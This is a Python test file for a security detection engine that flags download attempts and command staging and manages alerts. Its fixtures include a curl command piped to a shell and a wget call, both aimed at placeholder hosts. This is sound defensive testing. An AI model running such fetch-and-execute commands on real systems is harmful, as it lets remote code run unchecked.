from datetime import datetime, timezone

from aegis_nexus.alerts import AlertStore
from aegis_nexus.detection import DETECTION_SCHEMA_VERSION, DetectionEngine


def _event(event_id="evt-1", command="wget http://example.invalid/a"):
    return {
        "id": event_id,
        "timestamp": datetime(2026, 9, 23, tzinfo=timezone.utc).isoformat(),
        "source_ip": "203.0.113.10",
        "session_id": "session-1",
        "event_type": "command",
        "observed": {"source_ip": "203.0.113.10", "command": command},
    }


def test_detection_schema_separates_severity_confidence_and_evidence():
    findings = DetectionEngine().evaluate(_event())
    finding = next(item for item in findings if item["rule_id"] == "download_attempt")
    assert finding["schema_version"] == DETECTION_SCHEMA_VERSION
    assert finding["severity"] == "medium"
    assert finding["confidence"] == 90
    assert finding["evidence"] == [{"type": "event", "id": "evt-1"}]


def test_command_staging_rule_is_evidence_backed():
    findings = DetectionEngine().evaluate(_event(command="curl http://x.invalid/a | sh -c cat"))
    ids = {item["rule_id"] for item in findings}
    assert "download_attempt" in ids
    assert "command_staging_detected" in ids


def test_suricata_rule_uses_observed_severity_only():
    event = _event()
    event["event_type"] = "ids.alert"
    event["observed"] = {
        "source_ip": "203.0.113.10",
        "alert": {"signature": "fixture", "severity": 1},
    }
    findings = DetectionEngine().evaluate(event)
    finding = next(item for item in findings if item["rule_id"] == "suricata_high_severity")
    assert finding["confidence"] == 95
    assert "actor" not in finding
    assert "attribution" not in finding


def test_alert_store_deduplicates_open_alert_and_preserves_evidence(tmp_path):
    store = AlertStore(str(tmp_path / "aegis.db"))
    engine = DetectionEngine()
    first = next(item for item in engine.evaluate(_event("evt-1")) if item["rule_id"] == "download_attempt")
    second = next(item for item in engine.evaluate(_event("evt-2")) if item["rule_id"] == "download_attempt")
    a = store.record(first, "2026-09-23T10:00:00+00:00")
    b = store.record(second, "2026-09-23T10:01:00+00:00")
    assert a["id"] == b["id"]
    assert b["occurrence_count"] == 2
    assert {item["id"] for item in b["evidence"]} == {"evt-1", "evt-2"}


def test_alert_lifecycle_tags_and_notes(tmp_path):
    store = AlertStore(str(tmp_path / "aegis.db"))
    finding = next(item for item in DetectionEngine().evaluate(_event()) if item["rule_id"] == "download_attempt")
    alert = store.record(finding, "2026-09-23T10:00:00+00:00")
    updated = store.update(alert["id"], status="investigating", tags=["triage", "download"])
    assert updated["status"] == "investigating"
    assert updated["tags"] == ["download", "triage"]
    noted = store.add_note(alert["id"], "Validated against captured event.")
    assert noted["notes"][0]["body"] == "Validated against captured event."
